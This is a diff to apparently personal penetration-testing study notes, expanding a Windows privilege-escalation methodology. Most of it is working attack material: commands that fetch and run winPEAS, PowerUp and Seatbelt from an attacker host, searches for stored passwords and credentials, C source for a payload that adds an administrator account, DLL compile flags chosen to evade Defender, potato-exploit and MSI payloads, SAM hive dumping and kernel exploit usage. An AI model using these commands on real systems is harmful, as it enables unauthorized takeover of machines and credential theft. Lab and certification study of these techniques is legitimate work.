@@ -429,79 +429,185 @@ Full breakdown: [[Password Attacks (Breakdowns)#memssp: why SSPI-layer intercept
 
 ### Phase 3: Privilege Escalation
 
-#### Step 1: Quick Enumeration
+> Full technique details + lab walkthroughs: [[Windows Privilege Escalation]]. Quick command lookup: [[Windows Privilege Escalation (Command Appendix)]]. "I found X, what do I try": [[Windows Privilege Escalation (Decision Tree)]].
+
+#### Step 1: Situational Awareness
 ```cmd
-systeminfo
-hostname
 whoami /all
 whoami /priv
 net user
 net localgroup
-net user username
 net localgroup Administrators
+systeminfo
+hostname
 ipconfig /all
 route print
 netstat -ano
 tasklist /v
 wmic qfe list
 wmic product get name,version
+wmic service get name,displayname,pathname,startmode
+sc.exe query type= all state= all
+```
+
+#### Step 1.5: Sensitive Info Hunting (before tools)
+
+PSReadLine command history (typed credentials end up here):
+```powershell
+Get-Content "$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -ErrorAction SilentlyContinue
+Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -ErrorAction SilentlyContinue | Get-Content
+```
+
+Transcript files (recorded by Script Block Logging):
+```powershell
+Get-ChildItem C:\Users\*\Documents\PowerShell* -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem "C:\Windows\system32" -Filter "*transcript*" -ErrorAction SilentlyContinue
+```
+
+Search files for passwords:
+```powershell
+Get-ChildItem -Path C:\ -Include *.txt,*.ini,*.cfg,*.config,*.xml,*.log -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","pass","secret" -ErrorAction SilentlyContinue
+Get-ChildItem C:\Users\*\Desktop\*.txt -ErrorAction SilentlyContinue | Get-Content
+Get-ChildItem "C:\Users\*\My Documents\*.txt" -ErrorAction SilentlyContinue | Get-Content
+```
+
+Saved credentials / AutoLogon:
+```cmd
+cmdkey /list
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
+reg query HKCU /f password /t REG_SZ /s
 ```
 
 #### Step 2: Automated Enumeration
 ```powershell
-# WinPEAS
-iwr -uri http://<attacker_ip>/winPEASx64.exe -Outfile winPEAS.exe
-.\winPEAS.exe
+# winPEAS -- full automated check, pipe to file for easy review
+iwr -uri http://<kali-ip>/winPEASx64.exe -OutFile winPEAS.exe
+.\winPEAS.exe | Tee-Object -FilePath winpeas_out.txt
 
-# PowerUp
-IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1')
-. .\PowerUp.ps1
+# PowerUp -- service/path/registry checks
+IEX(New-Object Net.WebClient).DownloadString('http://<kali-ip>/PowerUp.ps1')
 Invoke-AllChecks
+
+# Seatbelt -- deeper Windows specifics (DPAPI masterkeys, task details, app versions)
+iwr -uri http://<kali-ip>/Seatbelt.exe -OutFile Seatbelt.exe
+.\Seatbelt.exe -group=all
 ```
 
-#### Step 3: Common Privilege Escalation Vectors
+> Defender quarantines known pre-compiled winPEAS EXE on sight. If it disappears after upload, the file size goes 0 -- Defender got it. Custom DLLs and non-signature-matched EXEs survive much better.
 
-**Unquoted Service Paths**:
-```cmd
-wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
-Get-UnquotedService  # PowerUp
-```
+#### Step 3: Service Attack Vectors
 
-**Service Binary Hijacking**:
-```cmd
-icacls "C:\Path\to\service.exe"
-# If writable, replace with malicious binary
-```
-
-**DLL Hijacking**:
-- Use Process Monitor to find missing DLLs
-- Place malicious DLL in application directory
-
-**Potato Attacks (SeImpersonatePrivilege)**:
-```cmd
-whoami /priv
-# If SeImpersonatePrivilege enabled:
-SweetPotato.exe -p whoami
-```
-
-**AlwaysInstallElevated**:
+PowerUp quick sweep:
 ```powershell
-Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
-Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer
+Get-ModifiableServiceFile   # service binary is writable
+Get-UnquotedService         # unquoted path + writable intermediate directory
+Get-ModifiableService       # service config (binPath) is writable
+```
+
+**Service Binary Hijacking** (you can write to the service EXE):
+```powershell
+icacls "C:\Path\to\service.exe"
+# BUILTIN\Users:(F) or (W) or (M) = writable. Replace with adduser payload.
+```
+Adduser payload (compile on Kali):
+```bash
+x86_64-w64-mingw32-gcc -o payload.exe adduser.c -ladvapi32
+```
+```c
+// adduser.c
+#include <stdlib.h>
+int main() {
+    system("net user hacker Passw0rd! /add");
+    system("net localgroup Administrators hacker /add");
+    return 0;
+}
+```
+Then: restart the service (or wait for auto-restart / reboot trigger).
+
+**DLL Hijacking** (service loads a missing DLL from a user-writable directory):
+```powershell
+icacls "C:\Path\to\service\dir\"   # BUILTIN\Users has Write = go
+# Check what the service loads: strings against the EXE, or Process Monitor NAME NOT FOUND results
+```
+Minimal DLL payload (cross-compile on Kali):
+```bash
+x86_64-w64-mingw32-gcc -shared -nostdlib -nostartfiles \
+  -fno-stack-check -mno-stack-arg-probe \
+  -Wl,--entry,DllMainCRTStartup \
+  -o MissingDll.dll payload.c -lkernel32 -ladvapi32
+```
+The `-nostdlib -nostartfiles` strip CRT code Defender flags. `-fno-stack-check -mno-stack-arg-probe` prevent a linker error from missing `___chkstk_ms`. Trigger: service must restart to load the DLL.
+
+**Unquoted Service Path** (path has a space, no quotes, intermediate dir is writable):
+```cmd
+wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """"
+icacls "C:\Program Files\Vuln App\"   # writable = plant payload at the first ambiguous component
+# e.g. C:\Program Files\Vuln App\service.exe → plant C:\Program Files\Vuln.exe
+sc start ServiceName
+```
+
+#### Step 4: Scheduled Task Attacks
+
+```powershell
+Get-ScheduledTask | Where-Object {$_.Principal.UserId -notin @("SYSTEM","LOCAL SERVICE","NETWORK SERVICE","Users","Administrators")} | Select-Object TaskName,@{N="Binary";E={$_.Actions.Execute}},@{N="User";E={$_.Principal.UserId}}
+schtasks /query /fo LIST /v | findstr /i "task\|run\|user\|next"
+```
+
+Three questions: (1) what user does it run as? (2) is the binary it calls writable? (3) how often does it run?
+
+If the binary is writable: replace it with an adduser or reverse shell payload. Task fires on schedule. No service restart needed.
+
+#### Step 5: Kernel Exploits
+
+Check patch level:
+```powershell
+Get-CimInstance -Class win32_quickfixengineering | Where-Object {$_.Description -eq "Security Update"} | Sort-Object HotFixID
+```
+
+OSCP-era patches to verify:
+- **KB5027215 absent** → CVE-2023-29360 (Microsoft Streaming Service Proxy EoP, spawns interactive SYSTEM process)
+- **KB5025221/KB5025224 absent** → CVE-2023-28252 (CLFS driver UAF, in-process SYSTEM token swap)
+
+Run the exploit. Key notes:
+- Exploits spawning an interactive `cmd.exe` only give a usable shell under RDP, not WinRM or nc. Always pass `"cmd.exe /c <command>"` and write output to a file for non-interactive contexts.
+- CVE-2023-28252 bkstephen PoC hardcodes `C:\Users\Public\` as working dir. If that path is denied in a WinRM session, try the exact same binary from a bind or reverse shell -- ACLs can differ between session types.
+
+```powershell
+.\clfs_eop.exe "cmd.exe /c whoami > C:\Services\out.txt"
+type C:\Services\out.txt
+```
+
+#### Step 6: Special Privilege Paths
+
+**SeImpersonatePrivilege** (common on IIS app pools, SERVICE accounts, after token theft):
+```powershell
+whoami /priv   # SeImpersonatePrivilege Enabled
+iwr -uri http://<kali-ip>/SigmaPotato.exe -OutFile SigmaPotato.exe
+.\SigmaPotato.exe "net user hacker Passw0rd! /add"
+.\SigmaPotato.exe "net localgroup Administrators hacker /add"
+# Then evil-winrm as hacker
+```
+
+**SeBackupPrivilege** (Backup Operators group members):
+```powershell
+whoami /groups   # BUILTIN\Backup Operators
+# Dump SAM and SYSTEM hives (readable with backup semantics, crackable offline):
+reg save HKLM\SAM C:\Temp\sam.bak /y
+reg save HKLM\SYSTEM C:\Temp\system.bak /y
+# Or read any file directly via FILE_FLAG_BACKUP_SEMANTICS in a custom DLL/tool
+```
+
+**AlwaysInstallElevated** (MSI installs as SYSTEM regardless of user rights):
+```powershell
+Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer -Name AlwaysInstallElevated -ErrorAction SilentlyContinue
+# Both must be 1
+```
+```bash
+msfvenom -p windows/adduser USER=hacker PASS=Passw0rd! -f msi -o shell.msi
+```
+```cmd
 msiexec /quiet /qn /i C:\Users\Public\shell.msi
 ```
 
-**UAC Bypass**:
-```bash
-# Metasploit
-use exploit/windows/local/bypassuac_sdclt
-set SESSION 1
-set LHOST <attacker_ip>
-run
-```
-
-**Kernel Exploits**:
-```cmd
-systeminfo
-searchsploit windows <build_number>
-```
+#### Tags: #WindowsPrivesc #PrivilegeEscalation #winPEAS #PowerUp #DLLHijack #ServiceBinaryHijacking #UnquotedServicePath #SeImpersonatePrivilege #SeBackupPrivilege #KernelExploit #CVE202328252 #CVE202329360 #ScheduledTasks #SigmaPotato #Module17 #Methodology
